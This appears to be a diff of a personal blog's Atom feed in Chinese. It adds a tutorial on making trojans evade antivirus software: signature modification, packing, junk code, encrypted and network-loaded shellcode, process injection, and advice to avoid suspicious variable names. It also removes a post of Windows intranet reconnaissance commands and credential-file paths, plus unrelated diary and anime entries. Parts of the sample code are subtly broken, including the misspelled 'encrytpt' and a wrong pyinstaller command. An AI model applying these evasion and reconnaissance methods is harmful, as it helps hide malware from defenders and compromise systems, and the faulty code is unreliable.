+    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>绝大多数用户PC上都装有杀毒软件，绕过杀毒软件顺利进入系统执行即为免杀。</p><span id="more"></span><h1 id="免杀技术"><a href="#免杀技术" class="headerlink" title="免杀技术"></a>免杀技术</h1><p>免杀技术全称为反杀毒技术Anti Anti- Virus简称“免杀”，它指的是一种能使病毒木马免于被杀毒软件查杀的技术。由于免杀技术的涉猎面非常广，其中包含反汇编、逆向工程、系统漏洞等黑客技术，所以难度很高，一般人不会或没能力接触这技术的深层内容。其内容基本上都是修改病毒、木马的内容改变特征码，从而躲避了杀毒软件的查杀。</p><h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><h3 id="查杀分类"><a href="#查杀分类" class="headerlink" title="查杀分类"></a>查杀分类</h3><ul><li>静态免杀：一般根据特征码识别，然后对文件进行特征匹配。</li><li>行为查杀（动态查杀）：主要是对其产生的行为进行特征匹配。</li><li>云查杀：提取出文件的特征和上传云端，云端进行检测后返回客户端，对相应病毒进行查杀。</li></ul><p><strong>静态免杀</strong><br>对于静态免杀，针对的是杀毒软件的静态文件扫描，云查（病毒库）杀。</p><p>杀毒是提取文件一段“特征码”来识别病毒文件。<br>特征码：能识别一个程序是一个病毒的一段不大于 64 字节的特征串</p><p>那杀毒软件是怎么提取文件特征码的？<br>如果我们知道了一个文件是病毒，那么通过 md5 肯定可以判断一个就是这个病毒文件，那如果该病毒文件做了小小变动呢，直接 md5 肯定是不行了，那杀毒软件是怎么做的呢？这里有个叫做“模糊哈希”（Fuzzy Hashing）算法的东西。<br>模糊哈希算法又叫基于内容分割的分片分片哈希算法（context triggered piecewise hashing, CTPH），主要用于文件的相似性比较。</p><p>大致就可以理解为，不要把一个文件的所有内容都拿来计算 hash，而通过分片，取出部分重要（不易改变）的内容进行 hash 计算，这样就能达到通过一个特征码找到类似的病毒变种。</p><p>特征码定位工具：原理就是分割文件，某些分割部分填入数据 (0)，如果扫描该部分不报警，则特征码在这个部分。如此反复，直到找到很短的某一段内容。不同工具之间区别是使用的分割算法不同，查找特征码的效果不同。</p><p>目前比较常有名气的特征码定位器主要有 CCL 与 MYCCL，他们都采用文件分块定位的办法，定位效果带有运气成份，且可能每次定位出的位置都不尽相同，这个免杀带来了困难。</p><h3 id="免杀分类"><a href="#免杀分类" class="headerlink" title="免杀分类"></a>免杀分类</h3><ul><li>开源免杀：指的是拥有病毒、木马原始码的前提下，通过修改原始码进行免杀。</li><li>手工免杀：指的是仅有病毒、木马的可执行文件（PE文件）的情况下进行免杀。</li><li>自动免杀：指的是病毒、木马自身能自动变异，如：千面人病毒。</li></ul><p><strong>手工免杀(仅限有源码)</strong></p><ol><li>mian 中屏蔽所有代码，编译，扫描。不报的话继续 2，如果依然报毒，去 5。</li><li>放开一层（可以多层、二分也可以）函数，编译，扫描。不报的话，重复 2。直到定位到某个函数或者多个函数，进入 3。</li><li>在函数内部屏蔽部分代码（二分），编译，扫描。不报，重复 2。</li><li>直到定位某段代码（无自定义内部调用），特征码在此。</li><li>是不是有附加数据，或者资源存储的文件。有，单独检查该文件或者数据，方法从 1 开始。如果没有，那去找找 PE 头吧。</li></ol><p>大致流程：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1. sub1 //未报2. sub1 sub2 //未报3. sub1 sub2 sub3 //报4. sub1 sub2 sub3(sub31) //未报5. sub1 sub2 sub3(sub31 sub32) //报6. sub1 sub2 sub3(sub31 sub32(sub321)) //报...直到找到某API调用，或者逻辑代码（没有自定义函数调用）</span><br></pre></td></tr></table></figure><h2 id="技术概览"><a href="#技术概览" class="headerlink" title="技术概览"></a>技术概览</h2><h3 id="加壳脱壳与加密解密"><a href="#加壳脱壳与加密解密" class="headerlink" title="加壳脱壳与加密解密"></a>加壳脱壳与加密解密</h3><ul><li>加壳压缩是一种对EXE档案的数据压缩及加密保护，可以将EXE档案压缩成自我解压档案，并能隐藏解压进程。</li><li>在免杀技术里所谓的壳与伪装壳其实就是压缩与外层数据伪装，其实是利用特殊的算法，对可执行文件与动态库里的资源进行压缩与对文件的描述、版本号、创建日期、修改软件、系统执行需求等外层数据进行伪装。</li><li>脱壳就是把已压缩与伪装的文件完全或近似还原到未压缩与伪装的状态。最常用的加壳软件就是WinRAR。</li><li>加密是将明文信息隐匿起来，使之在缺少特殊信息时全部或部分数据不可读，令杀毒软件无从下手。</li><li>而解密就是令在宿主电脑中的病毒得到密钥，从而突然发作。<br>压缩壳：upx, aspack, fsg, pecompach<br>加密壳：ASProtect, Armadillo(穿山甲), EXEcryptor, Themida, ZProtect<br>虚拟机壳：VMProtect</li></ul><h3 id="加花指令与程序入口点修改"><a href="#加花指令与程序入口点修改" class="headerlink" title="加花指令与程序入口点修改"></a>加花指令与程序入口点修改</h3><ul><li>加花指令就是在程序开头加入一段计算用的汇编指令和一些入口点内存地址的乱跳转，或加上其它常用程序特有的入口指令来迷惑杀毒软件。因为计算与跳转的最后结果是没有实质的意义的，所以这么做并不影响程序的正常运行。但能使一些杀毒软件无法正确识别木马程序，从而达到免杀的效果。</li><li>程序入口点修改就是改变入口点，通常用到的方法是在入口点上令电脑先处理那段没意义的指令，再在花指令后再加跳转代码，跳转到程序执行数据的入口点上，令程序正常运行。</li></ul><h3 id="内存、文件特征码的定位与修改"><a href="#内存、文件特征码的定位与修改" class="headerlink" title="内存、文件特征码的定位与修改"></a>内存、文件特征码的定位与修改</h3><p>众所周知大部分杀毒软件查杀病毒的根据就是对比特征码，而这个过程一般发生在内存与硬盘中。对比硬盘中储存着的文件的特征码，能全面地查杀电脑中的可疑文件；对比在内存中储存着的文件的特征码，能快速地查杀正在运行的程序是否带有病毒，另外病毒文件一旦进入内存即运行中，很可能会现出原形被杀毒软件查杀。针对杀毒软件这一特性，骇客们发明了内存、文件特征码修改免杀法。通常首先用特征码定位软件定位文件特征码的所在之处，再用UltraEdit对被定位的特征码段进行修改。</p><p>一般修改方法有：</p><ul><li>十六进制的特征码直接修改法，就是把十六进制的特征码加1；</li><li>字符串大小写修改法，就是特征码所对应的内容是字符串的时候，把大小字互换；</li><li>等价替换法，就是当特征码所对应的是汇编指令时，把指令替换成功能类拟的指令；</li><li>指令顺序调换法，把特征码对应的汇编指令的顺序互换；</li><li>通用跳转法，用跳转的方法把特征码对应的汇编指令跳转走，犹如加花一样。</li></ul><p>修改特征码的方法针对性很强很有用，但一次修改只能对一款杀毒软件免杀；要令另一款软件免杀，就要重新针对该软件修改特征码，因为各家杀毒软件公司使用的特征码基本上都不相同。</p><h2 id="免杀工具"><a href="#免杀工具" class="headerlink" title="免杀工具"></a>免杀工具</h2><p>常用工具有：</p><ul><li>加壳器：PEditor、MaskPE、UPX等</li><li>脱壳与分析器：PEid、ResScope、RL!dePacker、Restorator等</li><li>加花器：FakeNinja</li><li>特征码定位与修改器:CCL、OllyDbg、UltraEdit、MYCCL</li><li>调试器：SoftIce</li><li>反汇编器：IDA、W32Dasm等</li><li>十六进制编辑器：HIEW、UltraEdit等</li><li>开 发包：SDK与DDK</li><li>编译器：Microsoft Visual C++、Borland C++、Watcom C、GNU C以及Free Pascal等</li></ul><h2 id="常用沙箱和免杀工具"><a href="#常用沙箱和免杀工具" class="headerlink" title="常用沙箱和免杀工具"></a>常用沙箱和免杀工具</h2><p><a href="https://s.threatbook.com/">微步云沙箱</a><br><a href="https://www.virustotal.com/gui/home/upload">Virustotal</a><br><a href="https://habo.qq.com/">腾讯哈勃分析系统</a><br><a href="https://sandbox.ti.qianxin.com/sandbox/page">奇安信情报沙箱</a></p><p><a href="https://cuckoo-sandbox.readthedocs.io/zh_CN/latest/introduction/sandboxing.html">Cuckoo Sandbox本地沙箱</a><br><a href="https://www.clamav.net/">ClamAV-Linux下杀毒软件</a><br><a href="https://github.com/1y0n/AV_Evasion_Tool">掩日 - 适用于红队的综合免杀工具</a></p><h2 id="免杀方法"><a href="#免杀方法" class="headerlink" title="免杀方法"></a>免杀方法</h2><ol><li>对shellcode进行加密处理，如异或、转置、AES加密、Base64加密、多轮加密等。</li><li>对加载器代码进行加密或编码处理，使其静态特征不明显。</li><li>分离免杀，将shellcode和加载器代码放置于网络上，通过下载的方式进行加载，可进一步免除静态特征。</li><li>通过进程注入或借助傀儡进程进行加载和运行。</li><li>通过加壳的方式对木马进行混淆，进而绕过杀软。<br>（通过静态特征绕过杀软检测相对容易，但是要绕过沙箱或动态检测，则非常难）</li></ol><h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><h3 id="加密shellcode"><a href="#加密shellcode" class="headerlink" title="加密shellcode"></a>加密shellcode</h3><ol><li><p>异或加密<br>异或加密是简单的加密方式，异或运算根据二进制位进行按位运算，如果对应位相同，则为0，不同则为1。同时遵守以下规则：<br>如果a^b&#x3D;c，则可以将b视为密钥，c视为加密字符串，则b^c&#x3D;a，可根据密钥b和密文c，解密出a的值。</p></li><li><p>字符串反转<br>在python中，对一个字符串进行反转，使用 <code>str[::-1]</code> 即可。<br>如果 str&#x3D;’abcde’, str[::-1]&#x3D;’edcba’</p></li><li><p>将字节类型转换为字符串<br>由于python的shellcode为 <code>b&#39;&#39;</code> 的字节类型（也可视为二进制类型），而要进行加密或反转处理，只能针对字符串进行处理，所以还需要对将字节类型数据转换为字符串。可以利用python内置的binascii模块进行处理。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">buf = <span class="string">b&quot;\xfc\xe8\x8f\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b&quot;</span></span><br><span class="line"><span class="built_in">str</span> = binascii.b2a_hex(buf).decode()</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>)</span><br></pre></td></tr></table></figure></li><li><p>Python中实现AES加解密<br>加密过程：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 安装第三方库 pip install pycryptodome</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> b2a_hex, a2b_hex</span><br><span class="line"></span><br><span class="line">source = <span class="string">&#x27;hello-abc&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果source不足16位的倍数就用\0补足为16位</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(source.encode(<span class="string">&#x27;utf-8&#x27;</span>)) % <span class="number">16</span>:</span><br><span class="line">add = <span class="number">16</span> - (<span class="built_in">len</span>(source.encode(<span class="string">&#x27;utf-8&#x27;</span>)) % <span class="number">16</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">add = <span class="number">0</span></span><br><span class="line">source = source + (<span class="string">&#x27;\0&#x27;</span> * add)</span><br><span class="line"><span class="built_in">print</span>(source)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义密钥和偏移量，必须是16个字节、24个字节或32个字节</span></span><br><span class="line"><span class="comment"># key = &#x27;todayiswonderful-1234567&#x27;.encode()</span></span><br><span class="line">key = <span class="string">&#x27;todayiswonderful-FEDCBA987654321&#x27;</span>.encode()</span><br><span class="line">mode = AES.MODE_CBC</span><br><span class="line">iv = <span class="string">b&#x27;1234567890ABCDEF&#x27;</span></span><br><span class="line">cryptos = AES.new(key,mode,iv)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 进行加密处理</span></span><br><span class="line">cipher = cryptos.encrytpt(source.encode())</span><br><span class="line"><span class="built_in">print</span>(cipher)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 便于传播可以将其转换成16进制，结果为db86ba246ebdf73c8a3a8b26a98ecadf</span></span><br><span class="line"><span class="built_in">print</span>(b2a_hex(cipher).encode)</span><br></pre></td></tr></table></figure></li></ol><p>解密过程与加密过程相反即可</p><h3 id="加密加载器"><a href="#加密加载器" class="headerlink" title="加密加载器"></a>加密加载器</h3><ol><li><p>将加载器代码进行base64编码</p></li><li><p>将base64编码进行AES加密</p></li></ol><h3 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h3><p>将加密后的shellcode和加载器放在同一个python文件里。<br>然后使用 <code>exec()</code> 函数执行加载器代码。</p><p>最后使用 <code>pyinstaller.exe</code> 将python文件打包为exe文件，执行命令为：<br><code>pythoninstaller.exe -Fw shellcode_run.py</code></p><p>注意：不能将变量命名为诸如shellcode, trojan, virus等敏感字词。以免被杀毒软件查杀。</p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="https://www.wangan.com/p/7fy7f690c41538bf">免杀技术有一套</a><br><a href="https://bbs.huaweicloud.com/blogs/396696">免杀基础原理及实践免杀</a><br><a href="https://github.com/TideSec/BypassAntiVirus">远控免杀专题</a><br><a href="https://cloud.tencent.com/developer/article/2207475">MSF CS通用免杀项目</a></p>]]></content>
+    
+    
+    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;绝大多数用户PC上都装有杀毒软件，绕过杀毒软件顺利进入系统执行即为免杀。&lt;/p&gt;</summary>
+    
+    
+    
+    <category term="免杀" scheme="http://example.com/categories/%E5%85%8D%E6%9D%80/"/>
+    
+    
+    <category term="免杀" scheme="http://example.com/tags/%E5%85%8D%E6%9D%80/"/>
+    
+  </entry>
   
   <entry>
     <title>而立</title>
@@ -243,236 +469,6 @@
     
     
     <category term="内网渗透" scheme="http://example.com/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Windows内网渗透之信息收集</title>
-    <link href="http://example.com/2023/08/20/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
-    <id>http://example.com/2023/08/20/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</id>
-    <published>2023-08-19T16:00:00.000Z</published>
-    <updated>2023-08-25T07:50:34.972Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>之前学习内网渗透是跟随蜗牛学苑的视频，没有自己做笔记，所以忘得差不多了。在此从头开始。</p><span id="more"></span><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="基本命令"><a href="#基本命令" class="headerlink" title="基本命令"></a>基本命令</h2><p>主机名： <code>hostname</code><br>查询所有计算机名称 <code>dsquery computer</code><br>查看配置及补丁信息：<br><code>systeminfo</code><br><code>wmic qfe get description,installedOn /format:csv</code></p><p>查看版本： <code>ver</code></p><p>进程信息：<br><code>tasklist /svc</code><br><code>wmic process get caption,executablepath,commandline /format:csv</code><br><code>get-process</code></p><p>查看所有环境命令： <code>set</code></p><p>查看计划任务： <code>schtasks /QUERY /fo LIST /v</code></p><p>查看安装驱动： <code>DRIVERQUERY</code></p><p>查看操作系统信息：<br>架构： <code>wmic os get osarchitecture</code><br>系统名： <code>wmic os get caption</code></p><p>查看逻辑盘： <code>wmic logicaldisk get caption</code><br>查看安装的软件信息： <code>wmic product get name,version</code></p><p>查看服务信息：<br><code>wmic service list brief</code><br><code>sc query</code><br><code>Get-WmiObject win32_service | select PathName</code></p><h2 id="域信息"><a href="#域信息" class="headerlink" title="域信息"></a>域信息</h2><p>获取当前组的计算机名： <code>net view</code> (失败原因可能为防病毒程序或防火墙配置阻止与服务器的连接，禁用功能发现服务等。)<br>网络发现： <code>net view /all</code><br>查看所有域： <code>net view /domain</code><br>域信任信息： <code>nltest /domain_trusts</code><br>定位域控： <code>net time /domain</code><br>查看域中的用户名： <code>dsquery user</code><br>查询域组名称： <code>net group /domain</code><br>查询域管理员： <code>net group &quot;Domain Admins&quot; /domain</code></p><p>域控信息：<br><code>nltest /dclist:xx</code><br><code>Get-NetDomain</code><br><code>Get-NetDomainController</code><br><code>net group &quot;Domain controllers&quot;</code></p><h2 id="用户信息"><a href="#用户信息" class="headerlink" title="用户信息"></a>用户信息</h2><p>查看用户：<br><code>net user</code><br><code>woami</code> &#x2F; <code>whoami /priv</code> &#x2F; <code>whoami /all</code><br><code>wmic useraccount get /ALL /format:csv</code></p><p>用户特权信息： <code>whoami /priv</code><br>查看当前权限： <code>net localgroup administrators</code><br>查看在线用户： <code>quser</code> &#x2F; <code>qwinsta</code> &#x2F; <code>query user</code><br>查看当前计算机名，全名，用户名，系统版本，工作站域，登陆域： <code>net config Workstation</code><br>ACL信息： <code>Get-ACL</code><br>查看用户SID：<br><code>whoami /user</code><br><code>wmic useraccount get name,sid</code></p><h2 id="网络信息"><a href="#网络信息" class="headerlink" title="网络信息"></a>网络信息</h2><p>网卡信息： <code>ipconfig</code><br>ARP表： <code>arp -a</code><br>路由表： <code>route print</code><br>监听的端口： <code>netstat -ano</code><br>端口信息：<br><code>Get-NetTCPConnection</code><br>DNS缓存：<br><code>ipconfig /displaydns</code><br><code>Get-CimInstance -Namespace root/StandardCimv2 -ClassName MSFT_DNSClientCache</code></p><p>探测出网情况：<br><code>powershell -c &quot;1..65535 | % &#123;echo ((new-object Net.Sockets.TcpClient).Connect(&#39;allports.exposed&#39;,$_)) $_ &#125; 2&gt;$null&quot;</code></p><h2 id="防火墙"><a href="#防火墙" class="headerlink" title="防火墙"></a>防火墙</h2><p>查看防火墙状态： <code>netsh advfireall show allprofiles</code><br>防火墙日志目录： <code>netsh firewall show logging</code><br>防火墙规则：<br><code>netsh advfirewall firewall show rule name=all</code><br><code>netsh firewall show config</code><br><code>netsh firewall show state</code></p><h2 id="密码信息"><a href="#密码信息" class="headerlink" title="密码信息"></a>密码信息</h2><p>Windows RDP连接记录<br>浏览器中保存的账号密码<br>系统密码管理器中的各种密码<br>无人值守安装文件中的密码信息：<br><code>C:\sysprep.inf</code><br><code>C:\sysprep\sysprep.xml</code><br><code>C:\Windows\Panther\Unattend\Unattended.xml</code><br><code>C:\Windows\Panther\Unattended.xml</code></p><h2 id="票据信息"><a href="#票据信息" class="headerlink" title="票据信息"></a>票据信息</h2><p><code>cmdkey /l</code><br>klist<br>msf meterpreter</p><h2 id="特殊文件"><a href="#特殊文件" class="headerlink" title="特殊文件"></a>特殊文件</h2><p>文档<br>xlsx &#x2F; xls<br>docx &#x2F; doc<br>pptx &#x2F; ppt<br>vsdx &#x2F; vsd<br>md &#x2F; txt</p><p>压缩文件<br>zip &#x2F; rar &#x2F; 7z</p><p>VPN配置<br>ovpn</p><p>代码<br>py &#x2F; php &#x2F; jsp &#x2F; aspx &#x2F; asp &#x2F; sql</p><p>配置文件<br>conf &#x2F; ini &#x2F; xml</p><p>特定关键字<br>账号 &#x2F; 账户 &#x2F; 登录 &#x2F; login &#x2F; user<br>密码 &#x2F; pass<br>代码 &#x2F; 文档 &#x2F; 交接 &#x2F; 备份 &#x2F; git &#x2F; svn<br>邮箱 &#x2F; 通讯录 &#x2F; 集群 &#x2F; 办公<br>代理 &#x2F; 内网 &#x2F; VPN<br>设备 &#x2F; 资产<br>系统 &#x2F; 运维 &#x2F; 拓扑 &#x2F; 网络 &#x2F; IT<br>后台 &#x2F; 管理员 &#x2F; 数据库<br>监控 &#x2F; 隔离 &#x2F; 防火墙 &#x2F; 网闸 &#x2F; 巡检</p><h2 id="局域网存活主机"><a href="#局域网存活主机" class="headerlink" title="局域网存活主机"></a>局域网存活主机</h2><p>NetBIOS扫描<br>OXID扫描</p><h2 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h2><p>启用的共享文件夹<br>回收站<br>最近运行的命令<br>访问文件历史记录<br>查看补丁安装情况<br><code>wmic qfe get Caption,Description,HotFixID,InstalledOn</code></p><p>日志与事件信息<br><code>wevtuil</code><br><code>eventvwr</code></p><p>注册表信息<br><code>reg</code></p><p>安装的各类agent监控软件<br>安装的杀毒软件<br>查看&#x2F;设置后缀失联<br><code>assoc</code><br><code>assoc .ext=example</code></p><p>PowerShell版本<br>.Net版本<br>Wi-Fi密码</p>]]></content>
-    
-    
-    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;之前学习内网渗透是跟随蜗牛学苑的视频，没有自己做笔记，所以忘得差不多了。在此从头开始。&lt;/p&gt;</summary>
-    
-    
-    
-    <category term="内网渗透" scheme="http://example.com/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
-    
-    <category term="信息收集" scheme="http://example.com/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
-    
-    
-    <category term="内网渗透" scheme="http://example.com/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
-    
-    <category term="信息收集" scheme="http://example.com/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>觉悟的样子</title>
-    <link href="http://example.com/2023/08/16/Diary_20230816/"/>
-    <id>http://example.com/2023/08/16/Diary_20230816/</id>
-    <published>2023-08-15T16:00:00.000Z</published>
-    <updated>2023-08-17T02:52:08.379Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>我没有觉悟。</p><span id="more"></span><h1 id="有觉悟表现出的几个特征"><a href="#有觉悟表现出的几个特征" class="headerlink" title="有觉悟表现出的几个特征"></a>有觉悟表现出的几个特征</h1><ol><li>早上醒了或闹钟响了便起床，不会醒了之后继续睡。</li><li>原本诱惑的东西吸引力弱了很多。</li><li>不会三心二意。</li></ol><h1 id="现在"><a href="#现在" class="headerlink" title="现在"></a>现在</h1><p>现在的我没有觉悟，我能感觉到。<br>说到底，觉悟这种东西，不是凭借外界的什么就能达到，而是一种自发涌现的力量。<br>没有，那就是没有。</p><h1 id="前进"><a href="#前进" class="headerlink" title="前进"></a>前进</h1><p>大多数人，应该都是没有觉悟的。支撑人们前进的往往是外界因素，比如通过什么强制自己做什么，或者不做什么就会发生什么糟糕的事。</p><p>人等不到觉悟，便由锁链拉扯前行。</p>]]></content>
-    
-    
-    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;我没有觉悟。&lt;/p&gt;</summary>
-    
-    
-    
-    <category term="日志" scheme="http://example.com/categories/%E6%97%A5%E5%BF%97/"/>
-    
-    
-    <category term="生活" scheme="http://example.com/tags/%E7%94%9F%E6%B4%BB/"/>
-    
-    <category term="日志" scheme="http://example.com/tags/%E6%97%A5%E5%BF%97/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>重要</title>
-    <link href="http://example.com/2023/08/15/Diary_20230815/"/>
-    <id>http://example.com/2023/08/15/Diary_20230815/</id>
-    <published>2023-08-14T16:00:00.000Z</published>
-    <updated>2023-08-16T04:26:38.611Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>今天只说一点点。</p><span id="more"></span><h1 id="一句话"><a href="#一句话" class="headerlink" title="一句话"></a>一句话</h1><p>如果某些事足够重要，即使情况不利于你，也应当去做。    –Elon Musk</p><h1 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h1><p>写自己思考的东西，自己的看法，是为了不要忘记，为了强化自己的观点。<br>如果想到了什么，却不去记述，那么灵感很快会转瞬即逝。</p><p>我依旧想起了在很多年前的高中，我写了一首诗。拿给了一位朋友看。朋友说，即使平常不看诗，也觉得这首诗写得很好。水平大概是和顾城的“黑夜给了我黑色的眼睛，我却用它来寻找光明。”同等程度。<br>但是后来不知为何，我把所写的诗弄丢了，而我也再也想不起来，我自己曾经写的那首诗。<br>我感到十分可惜。</p><p>帕斯卡尔说，人是一根会思考的芦苇。</p><p>表达什么观点，高尚或卑劣，成熟或幼稚，都没有关系。重要的是去表达。<br>用笛卡尔的这句话做结尾很恰当：我思故我在。</p>]]></content>
-    
-    
-    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;今天只说一点点。&lt;/p&gt;</summary>
-    
-    
-    
-    <category term="日志" scheme="http://example.com/categories/%E6%97%A5%E5%BF%97/"/>
-    
-    
-    <category term="生活" scheme="http://example.com/tags/%E7%94%9F%E6%B4%BB/"/>
-    
-    <category term="日志" scheme="http://example.com/tags/%E6%97%A5%E5%BF%97/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>进展</title>
-    <link href="http://example.com/2023/08/13/Diary_20230813/"/>
-    <id>http://example.com/2023/08/13/Diary_20230813/</id>
-    <published>2023-08-12T16:00:00.000Z</published>
-    <updated>2023-08-13T18:01:20.786Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>有开头，进展不太顺利。</p><span id="more"></span><h1 id="习惯"><a href="#习惯" class="headerlink" title="习惯"></a>习惯</h1><p>习惯未成，感觉有些别扭。<br>明天约束一下自己。</p>]]></content>
-    
-    
-    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;有开头，进展不太顺利。&lt;/p&gt;</summary>
-    
-    
-    
-    <category term="日志" scheme="http://example.com/categories/%E6%97%A5%E5%BF%97/"/>
-    
-    
-    <category term="生活" scheme="http://example.com/tags/%E7%94%9F%E6%B4%BB/"/>
-    
-    <category term="日志" scheme="http://example.com/tags/%E6%97%A5%E5%BF%97/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>欢迎加入NHK--困境中的挣扎与释然</title>
-    <link href="http://example.com/2023/08/12/%E6%AC%A2%E8%BF%8E%E5%8A%A0%E5%85%A5NHK--%E5%AE%B6%E9%87%8C%E8%B9%B2%E7%9A%84%E6%8C%A3%E6%89%8E/"/>
-    <id>http://example.com/2023/08/12/%E6%AC%A2%E8%BF%8E%E5%8A%A0%E5%85%A5NHK--%E5%AE%B6%E9%87%8C%E8%B9%B2%E7%9A%84%E6%8C%A3%E6%89%8E/</id>
-    <published>2023-08-11T16:00:00.000Z</published>
-    <updated>2023-08-12T16:58:26.632Z</updated>
-    
-    <content type="html"><![CDATA[<p><img src="/images/%E4%B8%AD%E5%8E%9F%E5%B2%AC_10.png" alt="中原岬"></p><span id="more"></span><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这部是我打算在近段时间看的最后一部完结动画。这是一部将近20年前的动画作品。看完之后挺满足的。</p><h1 id="主题"><a href="#主题" class="headerlink" title="主题"></a>主题</h1><p>故事的主人公是22岁大学辍学的家里蹲男人佐藤达广。<br>动画里大致上有9个故事：</p><ol><li>男主受到女主（中原岬）邀请帮助他走出家里蹲状态。</li><li>男主与男二邻居高中学弟（山崎薰）一起制作美少女游戏。</li><li>男主与女主假扮情侣真约会。</li><li>男主与女二高中学姐（柏瞳）一起相约组团自杀。</li><li>男主想通过玩网游赚钱陷入痴迷状态。</li><li>男主被高中班长（小林惠）骗入传销。</li><li>男二回家继承家业。</li><li>男主拒绝女二学姐的外遇邀请。</li><li>男主走出家里蹲状态并了解到女主过去。</li></ol><p><img src="/images/%E4%B8%AD%E5%8E%9F%E5%B2%AC_3.png" alt=" "></p><h1 id="角色"><a href="#角色" class="headerlink" 